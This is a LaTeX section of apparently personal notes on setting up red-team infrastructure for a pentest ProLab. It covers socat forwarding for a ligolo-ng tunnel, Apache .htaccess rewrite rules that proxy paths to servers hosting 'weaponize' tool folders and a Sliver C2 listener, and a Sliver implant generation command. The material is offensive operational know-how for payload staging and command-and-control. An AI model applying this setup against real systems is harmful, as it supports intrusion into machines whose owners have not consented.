\section{prolab Infra}


\begin{itemize}
    \item port 443 for \verb+ligolo-ng+:
        \begin{itemize}
            \item \verb+logolo-ng+ port 11601
            \item \verb+socat+ (443 to 11601)
        \end{itemize}
    \item port 80  for all http(s) :
    \item 
        socat redirect to apache (8880) with redirectors
        \begin{itemize}
            \item http://<ip>/sliver/ \verb+http --lhost <ip|127.0.0.1> -lport <lport|8890>+ 
            \item http://<ip>/sharp/ \verb+uploadserver -b 127.0.0.1 8881 --directory /opt/windows/SharpCollection/NetFramework_4.7_x64+
            \item http://<ip>/win/ \verb+uploadserver -b 127.0.0.1 8882 --directory /opt/windows/windows_weaponize+
            \item http://<ip>/lin/ \verb+uploadserver -b 127.0.0.1 8883 --directory /opt/linux/linux_weaponize+
            \item http://<ip>/lab/ \verb+uploadserver -b 127.0.0.1 8884 --directory $(pwd)/utils+
            \item socat redirect 80 -> 11601
        \end{itemize}
\end{itemize}


\subsection{Apache proxy}
use \verb+.htaccess+ instead of config.
In order to use \verb+.htaccess+ files, we must tell apache to allow the files to override rules in the config. In the apache config, change None to All in the following block

\begin{verbatim}
<Directory /var/www/>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
\end{verbatim}

enable the module
\begin{verbatim}
sudo sed -i 's|#LoadModule rewrite_module |LoadModule rewrite_module |' /etc/httpd/conf/httpd.conf 
sudo sed -i 's|#LoadModule proxy_http_module |LoadModule proxy_http_module |' /etc/httpd/conf/httpd.conf 
sudo sed -i 's|#LoadModule proxy_module |LoadModule proxy_module |' /etc/httpd/conf/httpd.conf 
\end{verbatim}


Apache recommends that the server config file be used for \verb+mod_rewrite+, but we arenâ€™t running a production server and the benefit of not having to reload apache2 every time we make a change means we will use .htaccess.

\subsubsection{URI redirection}
\begin{verbatim}
root$ cat .htaccess
RewriteEngine On
RewriteCond %{REQUEST_METHOD} GET [AND]
RewriteCond %{REQUEST_URI} ^/sharp/(.*)$
RewriteRule ^sharp/(.*)$ http://127.0.0.1:8881/$1 [P]
RewriteCond %{REQUEST_URI} ^/win/(.*)$
RewriteRule ^win/(.*)$ http://127.0.0.1:8882/$1 [P]
RewriteCond %{REQUEST_URI} ^/lin/(.*)$
RewriteRule ^lin/(.*)$ http://127.0.0.1:8883/$1 [P]
RewriteCond %{REQUEST_URI} ^/lab/(.*)$
RewriteRule ^lab/(.*)$ http://127.0.0.1:8884/$1 [P]
RewriteCond %{REQUEST_URI} ^/sliver/(.*)$
RewriteRule ^sliver/(.*)$ http://127.0.0.1:8890/$1 [P]
#RewriteRule ^(.*)$ /tmux-pentest.yml [R=301,L]
\end{verbatim}


\subsubsection{User Agent Redirection}




\subsection{sliver listener}
\begin{verbatim}
    generate --http <ip>:<port|80>/sliver/...
\end{verbatim}





\subsection{links}

\begin{itemize}
    \item \href{https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/}{Strengthen Your Phishing with Apache mod\_rewrite and Mobile User Redirection}
    \item \href{https://htaccess.madewithlove.com/}{Test your htaccess rewrite rules}
\end{itemize}
